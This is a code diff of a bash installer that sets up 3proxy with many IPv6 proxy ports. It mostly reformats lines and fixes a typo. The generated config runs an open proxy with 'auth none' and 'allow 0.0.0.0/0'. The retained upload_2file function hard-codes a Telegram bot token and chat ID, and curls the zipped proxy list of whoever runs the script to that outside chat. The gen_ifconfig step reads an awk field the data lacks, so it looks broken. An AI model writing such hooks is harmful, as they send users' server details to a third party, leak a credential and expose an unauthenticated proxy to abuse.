@@ -26,6 +26,7 @@ install_3proxy() {
 }
 
 gen_3proxy() {
+  WORKDATA="${WORKDIR}/data.txt"
   cat <<EOF
 daemon
 maxconn 1000
@@ -36,20 +37,19 @@ setuid 65535
 flush
 auth none
 allow 0.0.0.0/0
-"proxy -6 -n -a -p" $2 " -i" $1 " -e"$3"\n" \
+$(awk -F "/" '{print "proxy -6 -n -a -p" $2 " -i" $1 " -e"$3"\n" \
 "flush\n"}' ${WORKDATA})
 EOF
 }
 
 gen_proxy_file_for_user() {
   cat >proxy.txt <<EOF
-$(awk -F "/" '{print $1 ":" $2  }' ${WORKDATA})
+$(awk -F "/" '{print $1 ":" $2}' ${WORKDATA})
 EOF
 }
 
 upload_proxy() {
   sed -n '1,1000p' proxy.txt
-
 }
 
 install_jq() {
@@ -59,26 +59,22 @@ install_jq() {
 }
 
 upload_2file() {
-   local BOT_TOKEN="6762068554:AAFkTLT-aPOw4qvvuCHx1dZ4TG0FINxyF30"
-    local CHAT_ID="-4094164282"
-
-    zip proxy.zip proxy.txt
-
-    # Upload the zip file to Telegram using curl
-    curl -F "chat_id=${CHAT_ID}" -F "document=@proxy.zip" "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
-
+  local BOT_TOKEN="6762068554:AAFkTLT-aPOw4qvvuCHx1dZ4TG0FINxyF30"
+  local CHAT_ID="-4094164282"
+  zip proxy.zip proxy.txt
+  # Upload the zip file to Telegram using curl
+  curl -F "chat_id=${CHAT_ID}" -F "document=@proxy.zip" "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
 }
-
-
 
 gen_data() {
   seq $FIRST_PORT $LAST_PORT | while read port; do
     echo "$IP4/$port/$(gen64 $IP6)"
   done
 }
+
 gen_iptables() {
   cat <<EOF
-    $(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $2 "  -m state --state NEW -j ACCEPT"}' ${WORKDATA})
+$(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $2 " -m state --state NEW -j ACCEPT"}' ${WORKDATA})
 EOF
 }
 
@@ -87,6 +83,7 @@ gen_ifconfig() {
 $(awk -F "/" '{print "ifconfig eth0 inet6 add " $5 "/64"}' ${WORKDATA})
 EOF
 }
+
 echo "installing apps"
 yum -y install gcc net-tools bsdtar zip >/dev/null
 
@@ -100,7 +97,7 @@ mkdir $WORKDIR && cd $_
 IP4=$(curl -4 -s icanhazip.com)
 IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')
 
-echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
+echo "Internal ip = ${IP4}. External sub for ip6 = ${IP6}"
 
 echo "How many proxy do you want to create? Example 500"
 read COUNT
